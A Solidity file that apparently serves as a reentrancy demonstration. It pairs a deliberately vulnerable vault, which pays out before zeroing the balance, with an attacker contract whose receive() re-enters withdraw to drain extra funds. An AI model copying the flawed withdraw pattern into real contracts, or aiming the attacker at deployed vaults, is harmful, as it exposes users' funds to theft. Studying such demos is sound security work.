// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract VulnerableVault {
    mapping(address => uint256) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];
        require(amount > 0, "empty");
        (bool sent,) = msg.sender.call{value: amount}("");
        require(sent, "send failed");
        balances[msg.sender] = 0;
    }
}

contract RecursiveAttacker {
    VulnerableVault public vault;
    uint256 public rounds;

    function setVault(address target) external { vault = VulnerableVault(target); }

    function attack() external payable {
        require(msg.value > 0, "deposit required");
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        if (rounds < 2 && address(vault).balance >= msg.value) {
            rounds += 1;
            vault.withdraw();
        }
    }
}
